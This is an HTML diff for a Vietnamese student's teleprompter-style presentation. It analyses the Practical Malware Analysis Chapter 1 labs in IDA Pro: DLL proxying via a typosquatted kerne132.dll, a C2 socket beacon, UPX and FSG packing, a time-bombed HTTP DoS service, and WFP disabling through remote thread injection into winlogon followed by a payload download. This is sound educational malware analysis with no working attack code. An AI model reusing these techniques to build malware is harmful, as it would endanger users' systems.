+      <div class="timeline-segments">
+        
+        <!-- Segment 1 -->
+        <div class="segment-card active-segment" id="seg-1">
+          <div class="segment-header">
+            <div class="segment-title">Phần 1: Mở Đầu & Lab 01-01 (Kỹ Thuật DLL Hijacking & Proxying)</div>
+            <span class="segment-time-badge">00:00 - 02:30 (150 giây)</span>
+          </div>
+
+          <div class="screen-action-box">
+            <div class="screen-action-title">
+              <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect><line x1="8" y1="21" x2="16" y2="21"></line><line x1="12" y1="17" x2="12" y2="21"></line></svg>
+              Thao tác trên màn hình (Screen Actions):
+            </div>
+            1. Mở IDA Pro hiển thị <code>Lab01-01.exe</code> tại hàm <code>_main</code> (<code>0x00401440</code>). Bấm <kbd>F5</kbd> để hiển thị mã giả Decompiler.<br>
+            2. Trỏ chuột vào chuỗi kiểm tra dòng lệnh <code>WARNING_THIS_WILL_DESTROY_YOUR_MACHINE</code> và hàm <code>CopyFileA</code>.<br>
+            3. Chuyển sang tab IDA Pro thứ hai mở <code>Lab01-01.dll</code>, chỉ vào <code>DllMain</code>, Mutex <code>SADFHUHF</code> và địa chỉ IP <code>127.26.152.13:80</code>.
+          </div>
+
+          <div class="teleprompter-script">
+            <p>"Chào thầy và các bạn, hôm nay em là <strong>Huỳnh Ngọc Hiếu</strong> xin phép trình bày báo cáo phân tích dịch ngược 4 bài lab trong Chương 1 sách Practical Malware Analysis, được thực hiện với công cụ IDA Pro kết hợp giao thức MCP và chuẩn hóa theo phương pháp luận REA."</p>
+            <p>"Đầu tiên là <strong>Lab 01-01</strong> gồm một cặp tệp: <code>Lab01-01.exe</code> và <code>Lab01-01.dll</code>. Tại hàm <code>_main</code>, mã độc kiểm tra tham số dòng lệnh an toàn mang tên <mark>WARNING_THIS_WILL_DESTROY_YOUR_MACHINE</mark>. Nếu không có tham số này, chương trình sẽ lập tức thoát để phòng ngừa chạy vô tình và qua mặt các sandbox tự động."</p>
+            <p>"Khi chạy với đúng cờ lệnh, chương trình không ghi đè trực tiếp mà sử dụng kỹ thuật <strong>DLL Proxying</strong>: nó ánh xạ <code>Kernel32.dll</code> thật vào bộ nhớ, cấu hình danh sách hàm xuất ủy nhiệm sang <code>Lab01-01.dll</code>, sau đó sao chép DLL độc vào thư mục <code>C:\windows\system32\kerne132.dll</code>. Điểm tinh vi ở đây là kỹ thuật <mark>Typosquatting</mark> ngụy trang chữ 'l' thành số '1'."</p>
+            <p>"Tiếp theo, hàm <code>sub_4010A0</code> duyệt đệ quy toàn bộ ổ đĩa <code>C:\*</code>, quét tìm các file <code>.exe</code> và chỉnh sửa trực tiếp bảng Import (IAT) từ <code>kernel32.dll</code> thành <code>kerne132.dll</code>. Do đó, bất kỳ ứng dụng nào khởi chạy về sau đều sẽ vô tình nạp DLL độc hại."</p>
+            <p>"Khi mở <code>Lab01-01.dll</code> tại <code>DllMain</code>, ta thấy mã độc tạo Mutex <code>SADFHUHF</code> để chống chạy trùng, kết nối socket tới C2 IP <mark>127.26.152.13:80</mark>, gửi tín hiệu beacon <code>hello</code> và lắng nghe lệnh điều khiển <code>exec</code> để kích hoạt dòng lệnh ngầm hoặc <code>sleep</code> để trì hoãn."</p>
+          </div>
+        </div>
+
+        <!-- Segment 2 -->
+        <div class="segment-card" id="seg-2">
+          <div class="segment-header">
+            <div class="segment-title">Phần 2: Lab 01-02 (Kỹ Thuật Đóng Gói UPX & Mã Độc DDoS Hẹn Giờ)</div>
+            <span class="segment-time-badge">02:30 - 05:00 (150 giây)</span>
+          </div>
+
+          <div class="screen-action-box">
+            <div class="screen-action-title">
+              <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect><line x1="8" y1="21" x2="16" y2="21"></line><line x1="12" y1="17" x2="12" y2="21"></line></svg>
+              Thao tác trên màn hình (Screen Actions):
+            </div>
+            1. Mở <code>Lab01-02.exe</code> nguyên bản trong IDA: chỉ ra phân đoạn <code>UPX0</code> có kích thước ảo 16KB nhưng dung lượng thô bằng 0.<br>
+            2. Mở cửa sổ Terminal, gõ lệnh giải nén: <code>upx -d Lab01-02.exe -o Lab01-02_unpacked.exe</code>.<br>
+            3. Mở file unpacked trong IDA, nhấn <kbd>F5</kbd> tại <code>sub_401040</code>, làm nổi bật cấu trúc <code>SystemTime.wYear = 2100</code> và vòng lặp 20 luồng tại <code>StartAddress</code>.
+          </div>
+
+          <div class="teleprompter-script">
+            <p>"Bước sang <strong>Lab 01-02</strong>, tệp tin nhị phân ban đầu chỉ có kích thước vỏn vẹn <mark>3,072 bytes</mark>. Khi quan sát cấu trúc PE, ta phát hiện ngay các phân đoạn đặc trưng <code>UPX0</code>, <code>UPX1</code> và bảng Import bị rút gọn chỉ còn 9 hàm API tự nạp. Đây là dấu hiệu nhận biết mẫu bị đóng gói bởi <mark>UPX 3.04</mark>."</p>
+            <p>"Sau khi chạy lệnh <code>upx -d</code> để giải nén, dung lượng tệp phình lên 16,384 bytes và toàn bộ các API quan trọng của <code>ADVAPI32.dll</code> và <code>WININET.dll</code> được phục hồi hoàn chỉnh."</p>
+            <p>"Phân tích hàm <code>_main</code> và <code>sub_401040</code>, mã độc kiểm tra Mutex <code>HGL345</code> rồi gọi <code>CreateServiceA</code> để tự cài đặt một Windows Service tên là <mark>MalService</mark> với cờ <code>SERVICE_AUTO_START</code> nhằm duy trì sự tồn tại bền vững qua các lần khởi động lại máy tính."</p>
+            <p>"Điểm độc đáo nhất ở mẫu này là cơ chế <strong>Time-bomb (Bom hẹn giờ)</strong>: hàm <code>SetWaitableTimer</code> thiết lập mốc thời gian kích hoạt đến tận <mark>năm 2100</mark> và chờ đợi bằng <code>WaitForSingleObject</code>. Kỹ thuật này giúp mã độc ngủ đông hàng chục năm để đánh lừa các sandbox phân tích động vốn chỉ chạy trong vài phút."</p>
+            <p>"Khi thời điểm đến, chương trình tạo đồng thời <strong>20 luồng độc lập</strong>. Mỗi luồng chạy một vòng lặp vô tận gửi HTTP GET requests tới <code>http://www.malwareanalysisbook.com</code> với User-Agent giả mạo <code>Internet Explorer 8.0</code> nhằm làm sập máy chủ mục tiêu - đây chính là một HTTP DoS Botnet."</p>
+          </div>
+        </div>
+
+        <!-- Segment 3 -->
+        <div class="segment-card" id="seg-3">
+          <div class="segment-header">
+            <div class="segment-title">Phần 3: Lab 01-03 (Phân Tích Packer FSG & Ranh Giới Phân Tích Tĩnh)</div>
+            <span class="segment-time-badge">05:00 - 07:30 (150 giây)</span>
+          </div>
+
+          <div class="screen-action-box">
+            <div class="screen-action-title">
+              <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect><line x1="8" y1="21" x2="16" y2="21"></line><line x1="12" y1="17" x2="12" y2="21"></line></svg>
+              Thao tác trên màn hình (Screen Actions):
+            </div>
+            1. Mở <code>Lab01-03.exe</code> trong IDA Pro, chuyển qua tab Imports chỉ ra đúng 2 hàm: <code>LoadLibraryA</code> và <code>GetProcAddress</code>.<br>
+            2. Chỉ vào Timestamp của Header bị làm giả về mốc Unix Epoch 0 (năm 1970).<br>
+            3. Mở mã hợp ngữ tại <code>start</code> (<code>0x00405000</code>), giải thích stub nén aPLib và lệnh nhảy <code>jmp 0x00401090</code>.
+          </div>
+
+          <div class="teleprompter-script">
+            <p>"Tiếp theo là <strong>Lab 01-03</strong>. Đây là một bài học kinh điển về tệp bị đóng gói bởi packer tùy biến phức tạp hơn: <mark>FSG 1.0 (Fast Small Good)</mark>."</p>
+            <p>"Ngay từ cái nhìn đầu tiên trên IDA, ta nhận thấy các chỉ số bất thường: Compile Timestamp bị làm sai lệch về <mark>ngày 01/01/1970</mark> (Unix Epoch 0). Bảng phân đoạn bị xáo trộn thành <code>seg000</code>, <code>seg001</code>, <code>seg002</code> thay vì các section chuẩn. Đặc biệt, bảng Imports chỉ còn đúng hai API duy nhất là <code>LoadLibraryA</code> và <code>GetProcAddress</code>, và ta không thể tìm thấy bất kỳ chuỗi ký tự có nghĩa nào trong không gian tệp tĩnh."</p>
+            <p>"Đi sâu vào mã hợp ngữ tại Entry Point <code>0x00405000</code>, ta thấy đây là đoạn stub giải nén sử dụng thuật toán aPLib. Stub này thực hiện giải mã trực tiếp luồng byte vào vùng địa chỉ ảo <code>0x00401000</code>, tự dò tìm tên DLL để tái tạo lại IAT trong RAM, và kết thúc bằng một lệnh nhảy xa <mark>jmp 0x00401090</mark> để chuyển giao quyền thực thi cho Original Entry Point (OEP)."</p>
+            <p>"Theo chuẩn phương pháp luận REA, Lab 01-03 đại diện cho ranh giới giới hạn của phân tích tĩnh đơn thuần: khi gặp packer tùy biến không thể unpack tự động bằng công cụ dòng lệnh, chuyên viên phân tích bắt buộc phải chuyển sang kỹ thuật phân tích động (Dynamic Analysis) với debugger (như x64dbg) để bẫy điểm dừng tại OEP và dump bộ nhớ qua Scylla."</p>
+          </div>
+        </div>
+
+        <!-- Segment 4 -->
+        <div class="segment-card" id="seg-4">
+          <div class="segment-header">
+            <div class="segment-title">Phần 4: Lab 01-04 (Process Injection, Tắt WFP & Trojan Dropper)</div>
+            <span class="segment-time-badge">07:30 - 10:30 (180 giây)</span>
+          </div>
+
+          <div class="screen-action-box">
+            <div class="screen-action-title">
+              <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect><line x1="8" y1="21" x2="16" y2="21"></line><line x1="12" y1="17" x2="12" y2="21"></line></svg>
+              Thao tác trên màn hình (Screen Actions):
+            </div>
+            1. Mở <code>Lab01-04.exe</code> trong IDA tại <code>_main</code> (<code>0x00401350</code>), chỉ ra các API PSAPI nạp động.<br>
+            2. Mở hàm <code>sub_401174</code>: làm nổi bật <code>SeDebugPrivilege</code>, <code>sfc_os.dll</code> Ordinal #2 và lệnh <code>CreateRemoteThread</code>.<br>
+            3. Mở Resource section, chỉ ra binary nhúng #101 và hàm trích xuất <code>FindResourceA</code>.<br>
+            4. Mở mã Decompiler của Resource #101: trỏ vào lệnh gọi <code>URLDownloadToFileA</code> tải từ <code>practicalmalwareanalysis.com/updater.exe</code>.
+          </div>
+
+          <div class="teleprompter-script">
+            <p>"Cuối cùng là bài lab phức tạp nhất trong Chapter 1: <strong>Lab 01-04</strong>. Đây là một mẫu mã độc tinh vi tích hợp chuỗi tấn công đa giai đoạn gồm leo thang đặc quyền, can thiệp tiến trình hệ thống, tắt cơ chế bảo vệ của Windows và thả trojan thế chỗ."</p>
+            <p>"Đầu tiên, tại hàm <code>_main</code>, mã độc nạp động thư viện <code>psapi.dll</code> để quét danh sách các tiến trình đang hoạt động, lọc tìm PID của tiến trình hệ thống trọng yếu mang tên <mark>winlogon.exe</mark>."</p>
+            <p>"Để có thể can thiệp vào một tiến trình hệ thống cấp cao, hàm <code>sub_4010FC</code> sử dụng <code>AdjustTokenPrivileges</code> để kích hoạt đặc quyền <mark>SeDebugPrivilege</mark>. Sau khi đã có đủ quyền, mã độc nạp thư viện <code>sfc_os.dll</code> và lấy địa chỉ hàm xuất không tên mang số thứ tự <mark>Ordinal #2</mark> - chính là hàm <code>SfcTerminateWatcherThread</code>."</p>
+            <p>"Tiếp theo, nó gọi <code>CreateRemoteThread</code> để tiêm luồng thực thi vào trong không gian nhớ của <code>winlogon.exe</code>, chính thức vô hiệu hóa cơ chế bảo vệ tệp hệ thống <strong>Windows File Protection (WFP)</strong>."</p>
+            <p>"Khi WFP đã bị vô hiệu hóa, mã độc di chuyển file Windows Update hợp pháp <code>wupdmgr.exe</code> sang thư mục Temp với tên <code>winup.exe</code>. Sau đó, nó gọi <code>FindResourceA</code> và <code>LoadResource</code> để trích xuất một tệp nhị phân nhúng sẵn trong section Resource mang định danh <mark>#101</mark>, ghi đè trực tiếp thế chỗ vào <code>C:\windows\system32\wupdmgr.exe</code> và kích hoạt."</p>
+            <p>"Khi Resource #101 chạy lên, nó thực hiện hai việc cùng lúc: vừa kích hoạt file gốc <code>winup.exe</code> trong thư mục Temp để người dùng nhìn thấy cửa sổ cập nhật bình thường không nghi ngờ, vừa âm thầm gọi <code>URLDownloadToFileA</code> kết nối tới đường dẫn <mark>http://www.practicalmalwareanalysis.com/updater.exe</mark>, tải payload giai đoạn 2 về lưu thành <code>wupdmgrd.exe</code> và chạy ngầm."</p>
+          </div>
+        </div>
+
+        <!-- Segment 5 -->
+        <div class="segment-card" id="seg-5">
+          <div class="segment-header">
+            <div class="segment-title">Phần 5: Tổng Kết & Giới Thiệu Ứng Dụng SPA</div>
+            <span class="segment-time-badge">10:30 - 11:30 (60 giây)</span>
+          </div>
+
+          <div class="screen-action-box">
+            <div class="screen-action-title">
+              <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect><line x1="8" y1="21" x2="16" y2="21"></line><line x1="12" y1="17" x2="12" y2="21"></line></svg>
+              Thao tác trên màn hình (Screen Actions):
+            </div>
+            1. Chuyển sang trình duyệt hiển thị Dashboard SPA đang chạy.<br>
+            2. Lướt qua các Tab: Tổng Quan, Deep Dive (Lab 1-4), Bảng IOCs và Ma trận MITRE ATT&CK.<br>
+            3. Nhấp thử nút "Sao Chép Tất Cả IOCs" để minh họa tính năng tương tác.
+          </div>
+
+          <div class="teleprompter-script">
+            <p>"Tổng kết lại qua 4 bài lab của Chapter 1: chúng ta đã nắm bắt trọn vẹn các kỹ thuật cốt lõi của mã độc: từ <strong>Duy Trì (Persistence)</strong> qua DLL Hijacking và Windows Service; <strong>Lẩn Tránh (Defense Evasion)</strong> qua UPX, FSG và kỹ thuật tắt WFP; <strong>Leo Thang Đặc Quyền (Privilege Escalation)</strong> với Token Privileges; cho đến <strong>Điều Khiển C2</strong> qua HTTP và Socket Beaconing."</p>
+            <p>"Toàn bộ kiến trúc, đồ thị phụ thuộc hàm, mã giả Hex-Rays và 22 chỉ số nhận diện IOCs đã được em tích hợp trọn vẹn vào ứng dụng <strong>Executive Reverse Engineering SPA Dashboard</strong> này, được triển khai trực tiếp trên nền tảng đám mây Vercel với đầy đủ tính năng tương tác, ma trận MITRE ATT&CK và khả năng sao chép IOCs một chạm."</p>
+            <p>"Em xin chân thành cảm ơn Thầy và các bạn đã theo dõi bài báo cáo!"</p>
+          </div>
+        </div>
+
+      </div>
+    </section>
+
+  </main>
+
+  <!-- ==========================================================================
+       FOOTER
+       ========================================================================== -->
+  <footer class="site-footer">
+    <div class="container footer-inner">
+      <div>
+        <strong>PMA Chapter 1 Reverse Engineering Dashboard</strong> &bull; Môn học IAM302 &bull; Đại học FPT
+      </div>
+      <div>
+        Sinh viên thực hiện: <strong>Huỳnh Ngọc Hiếu</strong> &bull; Chuẩn hóa theo phương pháp luận <strong>REA (morluto/rea)</strong>
+      </div>
+    </div>
+  </footer>
+
+  <!-- Toast Notification Container -->
+  <div id="toast-container"></div>
+
+  <!-- JavaScript Application Controller -->
+  <script src="js/app.js"></script>
+</body>
+</html>
